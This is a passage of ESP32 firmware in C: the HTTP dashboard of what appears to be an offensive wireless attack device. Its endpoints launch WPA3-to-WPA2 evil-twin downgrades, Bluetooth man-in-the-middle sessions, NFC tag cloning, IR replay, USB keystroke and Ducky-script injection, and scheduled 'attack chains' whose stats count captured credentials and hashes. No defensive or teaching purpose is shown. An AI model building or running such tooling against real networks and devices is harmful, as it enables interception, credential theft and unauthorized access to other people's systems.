    downgrade_set_evil_twin_wpa2(ssid, ch);
    downgrade_engine_init(DOWNGRADE_SSL);
    dashboard_log("WPA3→WPA2 downgrade: %s", ssid);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

static esp_err_t api_canary_create(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char buf[256];
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len <= 0) { httpd_resp_send_500(req); return ESP_OK; }
    buf[len] = '\0';

    char url[256] = {0};
    const char *u = strstr(buf, "\"url\"");
    if (u) {
        u = strchr(u + 5, '"');
        if (u) { u++; int i = 0; while (*u && *u != '"' && i < 255) url[i++] = *u++; }
    }

    canary_injector_start();

    canary_token_t token;
    canary_injector_create_token(url[0] ? url : NULL, &token);

    char resp[256];
    snprintf(resp, sizeof(resp), "{\"ok\":true,\"token\":\"%s\",\"url\":\"http://192.168.4.1:8888/track?token=%s\"}",
             token.token, token.token);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, resp, strlen(resp));
    dashboard_log("Canary created: %s", token.token);
    return ESP_OK;
}

static esp_err_t api_canary_list(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    canary_token_t tokens[32];
    int count = canary_injector_get_tokens(tokens, 32);

    size_t buf_size = count * 256 + 64;
    char *buf = malloc(buf_size);
    if (!buf) { httpd_resp_send_500(req); return ESP_OK; }
    int off = snprintf(buf, buf_size, "{\"count\":%d,\"tokens\":[", count);
    for (int i = 0; i < count; i++) {
        off += snprintf(buf + off, buf_size - off,
            "%c{\"token\":\"%s\",\"hits\":%lu,\"last_seen\":%llu}",
            i > 0 ? ',' : ' ', tokens[i].token, tokens[i].hit_count, tokens[i].last_seen_at);
    }
    off += snprintf(buf + off, buf_size - off, "]}");
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, buf, off);
    free(buf);
    return ESP_OK;
}

static esp_err_t api_behavioral_results(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    fingerprint_result_t results[16];
    int count = behavioral_get_results(results, 16);

    size_t bs = count * 256 + 64;
    char *buf = malloc(bs);
    if (!buf) { httpd_resp_send_500(req); return ESP_OK; }

    behavioral_classify();

    int off = snprintf(buf, bs, "{\"count\":%d,\"results\":[", count);
    for (int i = 0; i < count; i++) {
        off += snprintf(buf + off, bs - off,
            "%c{\"app\":\"%s\",\"confidence\":%.1f,\"pkts\":%lu,\"avg_size\":%lu,\"duration\":%lu}",
            i > 0 ? ',' : ' ', app_type_to_string(results[i].app),
            results[i].confidence, results[i].packet_count,
            results[i].avg_packet_size, results[i].duration_sec);
    }
    off += snprintf(buf + off, bs - off, "]}");
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, buf, off);
    free(buf);
    return ESP_OK;
}

/* ── API: BLE Proprietary Scan ──────────────────── */

static esp_err_t api_ble_proprietary(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    proprietary_scan_result_t results[32];
    int count = ble_scan_proprietary_get_results(results, 32);

    size_t bs = count * 256 + 64;
    char *buf = malloc(bs);
    if (!buf) { httpd_resp_send_500(req); return ESP_OK; }

    int off = snprintf(buf, bs, "{\"count\":%d,\"results\":[", count);
    for (int i = 0; i < count; i++) {
        off += snprintf(buf + off, bs - off,
            "%c{\"type\":\"%s\",\"battery\":%d,\"apple\":%d,\"samsung\":%d,\"tile\":%d,\"findmy\":%d,\"swiftpair\":%d}",
            i > 0 ? ',' : ' ',
            results[i].type, results[i].battery_level,
            results[i].is_apple, results[i].is_samsung,
            results[i].is_tile, results[i].is_findmy, results[i].is_swiftpair);
    }
    off += snprintf(buf + off, bs - off, "]}");

    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, buf, off);
    free(buf);
    return ESP_OK;
}

/* ── API: BLE MITM ──────────────────────────────── */

static esp_err_t api_ble_mitm_start(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char buf[256];
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len > 0) buf[len] = '\0';

    char target_name[64] = {0};
    const char *n = strstr(buf, "\"target\"");
    if (n) {
        n = strchr(n + 8, '"');
        if (n) { n++; int i = 0; while (*n && *n != '"' && i < 63) target_name[i++] = *n++; }
    }

    esp_err_t ret = ble_mitm_start(NULL, target_name[0] ? target_name : NULL, 5000);
    if (ret == ESP_OK) {
        dashboard_log("BLE MITM started (target: %s)", target_name[0] ? target_name : "any");
        httpd_resp_set_type(req, "application/json");
        httpd_resp_sendstr(req, "{\"ok\":true}");
    } else {
        httpd_resp_set_type(req, "application/json");
        httpd_resp_sendstr(req, "{\"ok\":false,\"error\":\"failed to start\"}");
    }
    return ESP_OK;
}

static esp_err_t api_ble_mitm_stop(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    ble_mitm_stop();
    dashboard_log("BLE MITM stopped");
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

static esp_err_t api_ble_mitm_status(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    ble_mitm_status_t st = ble_mitm_get_status();
    char addr_str[18];
    snprintf(addr_str, sizeof(addr_str), "%02x:%02x:%02x:%02x:%02x:%02x",
             st.target_addr[5], st.target_addr[4], st.target_addr[3],
             st.target_addr[2], st.target_addr[1], st.target_addr[0]);

    char resp[512];
    snprintf(resp, sizeof(resp),
        "{\"active\":%d,\"state\":\"%s\",\"central\":%d,\"peripheral\":%d,\"services\":%d,\"target\":\"%s\",\"addr\":\"%s\"}",
        st.active, st.state_str, st.central_connected, st.peripheral_connected,
        st.services_discovered, st.target_name, addr_str);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, resp, strlen(resp));
    return ESP_OK;
}

static esp_err_t api_ble_mitm_services(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    mitm_service_t svcs[8];
    int count = ble_mitm_get_discovered_services(svcs, 8);

    size_t bs = count * 1024 + 64;
    char *buf = malloc(bs);
    if (!buf) { httpd_resp_send_500(req); return ESP_OK; }

    int off = snprintf(buf, bs, "{\"count\":%d,\"services\":[", count);
    for (int i = 0; i < count; i++) {
        off += snprintf(buf + off, bs - off,
            "%c{\"start\":%d,\"end\":%d,\"chars\":[",
            i > 0 ? ',' : ' ', svcs[i].start_handle, svcs[i].end_handle);
        for (int c = 0; c < svcs[i].char_count; c++) {
            off += snprintf(buf + off, bs - off,
                "%c{\"handle\":%d,\"uuid\":\"0x%04x\",\"props\":%d}",
                c > 0 ? ',' : ' ', svcs[i].chars[c].handle,
                svcs[i].chars[c].uuid, svcs[i].chars[c].properties);
        }
        off += snprintf(buf + off, bs - off, "]}");
    }
    off += snprintf(buf + off, bs - off, "]}");

    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, buf, off);
    free(buf);
    return ESP_OK;
}

/* ── API: IR / NFC ──────────────────────────────── */

static esp_err_t api_ir_capture(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    ir_capture_t cap;
    esp_err_t ret = ir_capture_start(5000);
    if (ret != ESP_OK) {
        httpd_resp_set_type(req, "application/json");
        httpd_resp_sendstr(req, "{\"ok\":false,\"error\":\"capture_start_failed\"}");
        return ESP_OK;
    }

    /* Wait for ready (simplified for HTTP handler) */
    int timeout = 50;
    while (!ir_capture_is_ready() && timeout-- > 0) vTaskDelay(pdMS_TO_TICKS(100));

    if (ir_capture_is_ready()) {
        ir_capture_get(&cap);
        char resp[128];
        snprintf(resp, sizeof(resp), "{\"ok\":true,\"proto\":%d,\"addr\":%u,\"cmd\":%u}",
                 cap.protocol, cap.address, cap.command);
        httpd_resp_set_type(req, "application/json");
        httpd_resp_sendstr(req, resp);
    } else {
        ir_capture_stop();
        httpd_resp_set_type(req, "application/json");
        httpd_resp_sendstr(req, "{\"ok\":false,\"error\":\"timeout\"}");
    }
    return ESP_OK;
}

static esp_err_t api_ir_send(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char buf[128];
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len <= 0) { httpd_resp_send_500(req); return ESP_OK; }
    buf[len] = '\0';

    int proto = 0, addr = 0, cmd = 0;
    const char *p = strstr(buf, "\"proto\"");
    if (p) { p = strchr(p + 7, ':'); if (p) proto = atoi(p + 1); }
    const char *a = strstr(buf, "\"addr\"");
    if (a) { a = strchr(a + 6, ':'); if (a) addr = atoi(a + 1); }
    const char *c = strstr(buf, "\"cmd\"");
    if (c) { c = strchr(c + 5, ':'); if (c) cmd = atoi(c + 1); }

    if (proto == IR_PROTOCOL_NEC) ir_send_nec(addr, cmd);
    else if (proto == IR_PROTOCOL_SAMSUNG) ir_send_samsung(addr, cmd);
    else if (proto == IR_PROTOCOL_SONY) ir_send_sony(cmd, addr, 12);

    dashboard_log("IR send: proto=%d addr=0x%04x cmd=0x%02x", proto, addr, cmd);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

static esp_err_t api_ir_learned(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char names[16][64];
    int count = ir_learned_list(names, 16);
    size_t buf_size = (size_t)count * 80 + 32;
    if (buf_size < 32) buf_size = 32;  /* guard for count==0 */
    char *buf = malloc(buf_size);
    if (!buf) { httpd_resp_send_500(req); return ESP_OK; }

    int off = snprintf(buf, buf_size, "{\"count\":%d,\"names\":[", count);
    for (int i = 0; i < count; i++) {
        off += snprintf(buf + off, buf_size - (size_t)off,
                        "%c\"%s\"", i > 0 ? ',' : ' ', names[i]);
    }
    snprintf(buf + off, buf_size - (size_t)off, "]}");
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, buf);
    free(buf);
    return ESP_OK;
}

static esp_err_t api_nfc_detect(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    nfc_tag_info_t info;
    if (nfc_detect_tag(&info) == ESP_OK) {
        char uid_str[24] = {0};
        for (int i = 0; i < info.uid_len; i++) sprintf(uid_str + i * 2, "%02x", info.uid[i]);

        char resp[256];
        snprintf(resp, sizeof(resp), "{\"present\":true,\"type\":\"%s\",\"uid\":\"%s\",\"sectors\":%d}",
                 info.tag_type, uid_str, info.sector_count);
        httpd_resp_set_type(req, "application/json");
        httpd_resp_sendstr(req, resp);
    } else {
        httpd_resp_set_type(req, "application/json");
        httpd_resp_sendstr(req, "{\"present\":false}");
    }
    return ESP_OK;
}

static esp_err_t api_nfc_clone(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    uint8_t key[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    esp_err_t ret = nfc_clone_tag(key);
    char resp[64];
    snprintf(resp, sizeof(resp), "{\"ok\":%d}", ret == ESP_OK);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, resp);
    if (ret == ESP_OK) dashboard_log("NFC tag cloned successfully");
    return ESP_OK;
}

/* ── API: USB ────────────────────────────────────── */

static esp_err_t api_usb_status(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    const char *modes[] = {"HID","CDC","RNDIS","MSC","COMBO"};
    int mode = (int)usb_engine_get_mode();
    char buf[192];
    snprintf(buf, sizeof(buf),
        "{\"mode\":\"%s\",\"connected\":%d,\"os\":%d}",
        mode >= 0 && mode < 5 ? modes[mode] : "?",
        usb_engine_is_host_connected(),
        (int)usb_os_fingerprint());
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, buf, strlen(buf));
    return ESP_OK;
}

static esp_err_t api_usb_type(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char buf[512];
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len <= 0) { httpd_resp_send_500(req); return ESP_OK; }
    buf[len] = '\0';

    const char *t = strstr(buf, "\"text\"");
    if (t) {
        t = strchr(t + 6, '"');
        if (t) {
            t++;
            char text[256];
            int i = 0;
            while (*t && *t != '"' && i < 255) text[i++] = *t++;
            text[i] = '\0';
            usb_hid_send_string(text);
        }
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

static esp_err_t api_usb_release(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    usb_hid_release_all();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

static esp_err_t api_usb_ducky(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char buf[2048];
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len <= 0) { httpd_resp_send_500(req); return ESP_OK; }
    buf[len] = '\0';

    const char *s = strstr(buf, "\"script\"");
    if (s) {
        s = strchr(s + 8, '"');
        if (s) {
            s++;
            char script[1800];
            int i = 0;
            while (*s && *s != '"' && i < 1799) script[i++] = *s++;
            script[i] = '\0';
            usb_ducky_execute_string(script);
        }
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

static esp_err_t api_usb_payloads(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char names[32][64];
    int count = usb_payload_list(names, 32);

    size_t bs = count * 80 + 32;
    char *buf = malloc(bs);
    if (!buf) { httpd_resp_send_500(req); return ESP_OK; }

    int off = snprintf(buf, bs, "{\"count\":%d,\"payloads\":[", count);
    for (int i = 0; i < count; i++)
        off += snprintf(buf + off, bs - off, "%c\"%s\"", i > 0 ? ',' : ' ', names[i]);
    off += snprintf(buf + off, bs - off, "]}");

    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, buf, off);
    free(buf);
    return ESP_OK;
}

/* ── API: AI Engine ───────────────────────────────── */

static const char *ai_twin_type_name(ai_twin_type_t t)
{
    switch (t) {
        case TWIN_TYPE_BLE_DEVICE: return "BLE";
        case TWIN_TYPE_WIFI_AP:    return "WiFi";
        case TWIN_TYPE_USB_DEVICE: return "USB";
        case TWIN_TYPE_BEACON:     return "Beacon";
        default:                   return "Unknown";
    }
}

static esp_err_t api_ai_twins(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    ai_twin_profile_t twins[16];
    int count = ai_twin_list(twins, 16);

    size_t bs = count * 256 + 64;
    char *buf = malloc(bs);
    if (!buf) { httpd_resp_send_500(req); return ESP_OK; }

    int off = snprintf(buf, bs, "{\"count\":%d,\"twins\":[", count);
    for (int i = 0; i < count; i++) {
        off += snprintf(buf + off, bs - off,
            "%c{\"name\":\"%s\",\"type\":\"%s\",\"usage\":%lu}",
            i > 0 ? ',' : ' ', twins[i].name,
            ai_twin_type_name(twins[i].type),
            twins[i].usage_count);
    }
    off += snprintf(buf + off, bs - off, "]}");

    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, buf, off);
    free(buf);
    return ESP_OK;
}

static esp_err_t api_ai_twins_delete(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char buf[64];
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len <= 0) { httpd_resp_send_500(req); return ESP_OK; }
    buf[len] = '\0';

    int idx = 0;
    const char *i = strstr(buf, "\"index\"");
    if (i) { i = strchr(i + 7, ':'); if (i) idx = atoi(i + 1); }

    ai_twin_delete(idx);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

static esp_err_t api_ai_twins_spawn(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char buf[128];
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len <= 0) { httpd_resp_send_500(req); return ESP_OK; }
    buf[len] = '\0';

    int idx = 0;
    uint32_t dur = 10000;
    const char *i = strstr(buf, "\"index\"");
    if (i) { i = strchr(i + 7, ':'); if (i) idx = atoi(i + 1); }
    const char *d = strstr(buf, "\"duration\"");
    if (d) { d = strchr(d + 10, ':'); if (d) dur = atoi(d + 1); }

    ai_twin_spawn_ble(idx, dur);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

static esp_err_t api_ai_twins_spawn_all(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char buf[64];
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len <= 0) { httpd_resp_send_500(req); return ESP_OK; }
    buf[len] = '\0';

    uint32_t dur = 10000;
    const char *d = strstr(buf, "\"duration\"");
    if (d) { d = strchr(d + 10, ':'); if (d) dur = atoi(d + 1); }

    ai_twin_spawn_all(dur);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

static esp_err_t api_ai_models(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    const ai_decision_tree_t *tree = ai_get_app_classifier();
    const ai_knn_model_t *knn = ai_get_ble_device_classifier();

    char buf[512];
    int off = snprintf(buf, sizeof(buf), "{\"models\":[");
    bool first = true;
    if (tree) {
        off += snprintf(buf + off, sizeof(buf) - off,
            "%c{\"name\":\"app_classifier\",\"type\":\"decision_tree\",\"nodes\":%d,\"classes\":%d}",
            first ? ' ' : ',', tree->num_nodes, tree->num_classes);
        first = false;
    }
    if (knn) {
        off += snprintf(buf + off, sizeof(buf) - off,
            "%c{\"name\":\"ble_device_classifier\",\"type\":\"knn\",\"samples\":%d,\"classes\":%d}",
            first ? ' ' : ',', knn->num_samples, knn->num_classes);
        first = false;
    }
    off += snprintf(buf + off, sizeof(buf) - off, "]}");

    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, buf, off);
    return ESP_OK;
}

/* ── API: Orchestrator ───────────────────────────── */

static esp_err_t api_orch_health(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    system_health_t h;
    attack_orchestrator_get_health(&h);

    char buf[256];
    snprintf(buf, sizeof(buf),
        "{\"uptime_ms\":%lu,\"heap_free\":%lu,\"heap_min\":%lu,\"wifi_mode\":%lu,"
        "\"ble\":%d,\"camera\":%d,\"usb\":%d,\"creds\":%lu,\"hashes\":%lu,\"chains\":%lu}",
        h.uptime_ms, h.heap_free / 1024, h.heap_min / 1024,
        h.wifi_mode, h.ble_active, h.camera_active, h.usb_active,
        h.credentials_captured, h.hashes_captured, h.chains_executed);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, buf, strlen(buf));
    return ESP_OK;
}

static esp_err_t api_orch_chain_run(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char buf[64];
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len > 0) buf[len] = '\0';

    int chain = 1;
    const char *c = strstr(buf, "\"chain\"");
    if (c) { c = strchr(c + 7, ':'); if (c) chain = atoi(c + 1); }

    attack_orchestrator_run_chain((attack_chain_t)chain);
    dashboard_log("Orchestrator: chain %d started", chain);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

static esp_err_t api_orch_chain_stop(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    attack_orchestrator_stop_chain();
    dashboard_log("Orchestrator: chain stopped");
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

static esp_err_t api_orch_schedule(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char buf[64];
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len <= 0) { httpd_resp_send_500(req); return ESP_OK; }
    buf[len] = '\0';

    uint32_t interval = 60000;
    int chain = 1;
    const char *i = strstr(buf, "\"interval_ms\"");
    if (i) { i = strchr(i + 13, ':'); if (i) interval = atoi(i + 1); }
    const char *c = strstr(buf, "\"chain\"");
    if (c) { c = strchr(c + 7, ':'); if (c) chain = atoi(c + 1); }

    attack_orchestrator_schedule(interval, (attack_chain_t)chain);
    dashboard_log("Orchestrator: scheduled chain %d every %lu ms", chain, interval);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

static esp_err_t api_orch_schedule_stop(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    attack_orchestrator_unschedule();
    dashboard_log("Orchestrator: schedule stopped");
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

/* ── Watchdog ────────────────────────────────────── */

static void dashboard_watchdog_task(void *arg)
{
    while (1) {
        vTaskDelay(pdMS_TO_TICKS(30000));
        if (s_server == NULL) {
            ESP_LOGW(TAG, "Watchdog: HTTP server is NULL — attempting restart...");
            web_dashboard_init();
        } else {
            uint32_t free = esp_get_free_heap_size();
            uint32_t min_free = esp_get_minimum_free_heap_size();
            uint32_t hwm = uxTaskGetStackHighWaterMark(NULL);
            ESP_LOGI(TAG, "Watchdog: server OK, heap free: %lu KB, min ever: %lu KB, stack HWM: %lu",
                     free / 1024, min_free / 1024, hwm);
        }
    }
}

static void start_watchdog(void)
{
    static bool watchdog_started = false;
    if (watchdog_started) return;
    xTaskCreatePinnedToCore(dashboard_watchdog_task, "dash_wdt", 2048, NULL, 1, NULL, tskNO_AFFINITY);
    watchdog_started = true;
}

/* ── Try HTTPS first, fall back to HTTP ──────────── */

static esp_err_t try_start_server(void)
{
    /* Disable HTTPS to fix browser accessibility. Fall back to plain HTTP directly. */
    httpd_config_t cfg = HTTPD_DEFAULT_CONFIG();
    cfg.server_port = 80;
    cfg.max_open_sockets = 8;
    cfg.max_uri_handlers = sizeof(s_uris) / sizeof(s_uris[0]);
    cfg.lru_purge_enable = true;
    cfg.stack_size = 8192;

    uint32_t free_retry = esp_get_free_heap_size();
    uint32_t block_retry = heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL);
    ESP_LOGI(TAG, "HTTP fallback — heap free: %lu KB, largest block: %lu",
             free_retry / 1024, block_retry);

    esp_err_t ret = httpd_start(&s_server, &cfg);
    if (ret == ESP_OK) return ESP_OK;

    ESP_LOGW(TAG, "httpd_start (8 sockets, 8KB stack) failed: %s — retrying with 4 sockets, 6KB stack...",
             esp_err_to_name(ret));

    httpd_config_t cfg2 = HTTPD_DEFAULT_CONFIG();
    cfg2.server_port = 80;
    cfg2.max_open_sockets = 4;
    cfg2.max_uri_handlers = sizeof(s_uris) / sizeof(s_uris[0]);
    cfg2.lru_purge_enable = true;
    cfg2.stack_size = 6144;

    ret = httpd_start(&s_server, &cfg2);
    if (ret == ESP_OK) {
        ESP_LOGW(TAG, "HTTP server started with reduced config (4 sockets, 3KB stack)");
        return ESP_OK;
    }

    ESP_LOGE(TAG, "httpd_start FAILED after fallback: %s (heap: %lu KB, block: %lu)",
             esp_err_to_name(ret), free_retry / 1024, block_retry);
    return ret;
}

/* ── Init / Deinit ──────────────────────────────── */

esp_err_t web_dashboard_init(void)
{
    if (s_server) return ESP_OK;

    /* Allocate log buffer from PSRAM to save 16KB of internal DRAM */
    if (!s_log_buf) {
        s_log_buf = heap_caps_malloc(LOG_BUF_SIZE, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
        if (!s_log_buf) {
            /* Fallback: internal DRAM */
            s_log_buf = malloc(LOG_BUF_SIZE);
        }
        if (s_log_buf) memset(s_log_buf, 0, LOG_BUF_SIZE);
    }

    if (!s_ws_mutex) {
        s_ws_mutex = xSemaphoreCreateMutex();
    }

    load_api_key();

    esp_err_t ret = try_start_server();
    if (ret != ESP_OK) return ret;

    for (int i = 0; i < sizeof(s_uris) / sizeof(s_uris[0]); i++) {
        ret = httpd_register_uri_handler(s_server, &s_uris[i]);
        if (ret != ESP_OK) {
            ESP_LOGW(TAG, "Failed to register URI handler %d: %s", i, esp_err_to_name(ret));
        }
    }

    uint32_t hwm = uxTaskGetStackHighWaterMark(NULL);
    uint32_t free_after = esp_get_free_heap_size();
    ESP_LOGI(TAG, "Init complete — stack HWM: %lu, heap free: %lu KB",
             hwm, free_after / 1024);

    if (camera_engine_is_initialized()) {
        camera_engine_start_stream();
        dashboard_log("Camera stream active on /stream");
    }
    dashboard_log("Web dashboard online — http://192.168.4.1");
    ESP_LOGI(TAG, "Dashboard online — http://192.168.4.1");

    start_watchdog();
    return ESP_OK;
}

esp_err_t web_dashboard_deinit(void)
{
    if (s_server) {
        httpd_stop(s_server);
        s_server = NULL;
    }
    return ESP_OK;
}
